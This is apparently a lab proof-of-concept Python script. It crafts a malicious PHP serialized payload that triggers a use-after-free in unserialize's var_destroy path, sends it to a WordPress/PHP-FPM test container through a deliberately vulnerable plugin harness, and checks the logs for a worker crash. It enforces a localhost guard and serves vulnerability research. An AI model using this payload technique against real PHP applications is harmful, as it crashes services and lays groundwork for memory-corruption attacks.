#!/usr/bin/env python3
"""WordPress lab proof: var_destroy UAF → FPM child abort (LAB-ONLY).

This is the *impact* demonstration inside a real WordPress/FPM worker, not a
WordPress exploit: it requires the lab's `uaf-harness` mu-plugin
(`lab-wp-zendmm/uaf-harness/`), which models a plugin-level
double-unserialize bug:

  sink    : the plugin calls unserialize($_POST['d']) on user input;
  gadget  : WP_UAF_Gadget::__destruct() does a same-size spray, then
            re-enters unserialize('R:1020;').

The outer payload has 1018 serialized elements and a duplicate key, so the
object is destructed inside var_destroy() after the var_entries chain was
freed. On plain ZendMM the reclaimed bookkeeping makes data[1020] the spray
bytes, dereferenced as a zval* -> child abort (DoS).

Usage:
  (cd lab-wp-zendmm && docker compose up -d)
  python3 poc/verify_var_destroy_wp.py --target http://127.0.0.1:18095

Lab-only; localhost guard enforced by php2shell.guard.
"""

import argparse
import os
import re
import subprocess
import sys
import time
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from php2shell import probe
from php2shell.guard import check_host

GADGET = 'O:13:"WP_UAF_Gadget":2:{s:1:"p";s:7:"R:1020;";s:1:"n";i:%d;}'
CRASH_RE = re.compile(
    r"signal 11|SIGSEGV|exited on signal|zend_mm_heap corrupted|"
    r"child .* exit|Aborted", re.IGNORECASE)


def build_payload(spray=64, entries=1016):
    return "a:%d:{%s%s%s}" % (
        entries + 2,
        "i:0;N;" * entries,
        "i:99999;" + (GADGET % spray),
        "i:99999;i:42;",
    )


def docker_logs(container, since=10):
    try:
        out = subprocess.run(
            ["docker", "logs", "--since", f"{since}s", container],
            capture_output=True, text=True, timeout=20)
        return out.stdout + out.stderr
    except Exception as exc:  # noqa: BLE001
        return f"<docker logs failed: {exc}>"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18095")
    ap.add_argument("--container", default="php2shell-wp-zendmm")
    ap.add_argument("--spray", type=int, default=64,
                    help="gadget spray count (0 = no reclaim, silent UAF)")
    ap.add_argument("--entries", type=int, default=1016)
    ap.add_argument("--path", default="/?uaf=1")
    ap.add_argument("--wait", type=float, default=2.0)
    args = ap.parse_args()

    scheme, host, port = probe.parse_target(args.target)
    if scheme != "http":
        sys.exit("lab targets are plain HTTP")
    check_host(host)

    payload = build_payload(args.spray, args.entries)
    body = urllib.parse.urlencode({"d": payload}).encode()
    print("[*] var_destroy UAF — WordPress lab impact probe")
    print(f"    target: {host}:{port}{args.path}")
    print(f"    payload: {len(payload)} B, {args.entries + 2} elements, "
          f"spray={args.spray}")

    before = docker_logs(args.container, since=5)
    try:
        resp = probe.http_post(
            host, port, args.path, body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=40, recv_timeout=40)
    except OSError as exc:
        print(f"    request error: {exc}")
        resp = None
    status = probe.status(resp) if resp else "<no response>"
    print(f"    response: {status}  body={len(probe.body(resp)) if resp else 0} B")

    time.sleep(args.wait)
    log = docker_logs(args.container, since=8)
    new = log[len(before):] if log.startswith(before) else log
    crash = CRASH_RE.search(new) or CRASH_RE.search(log)

    if crash:
        hits = [ln.strip() for ln in log.splitlines() if CRASH_RE.search(ln)]
        line = hits[-1] if hits else crash.group(0)
        print(f"    container log: {line}")
        print()
        print("[EVIDENCE] WP var_destroy UAF reproduced: the FPM child aborted")
        print("    - a plugin-level sink + double-unserialize gadget reached")
        print("      var_destroy()'s unlocked destructor path;")
        print("    - the reclaimed var_entries made data[1020] attacker bytes,")
        print("      dereferenced as a zval* -> worker crash (DoS);")
        print("    - this is an application-gadget impact, not a WP-core bug.")
        return 0

    if str(status).startswith(("502", "504")):
        print()
        print("[EVIDENCE] FPM child aborted (502/504 from nginx); no log match")
        return 0

    print()
    print("[!] no crash observed. Check that the mu-plugin is present and the")
    print("    lab is installed:")
    print(f"    docker exec {args.container} "
          f"ls /var/www/html/wp-content/mu-plugins")
    print("    With --spray 0 the UAF is silent (control), so no crash is the")
    print("    expected result for that control.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
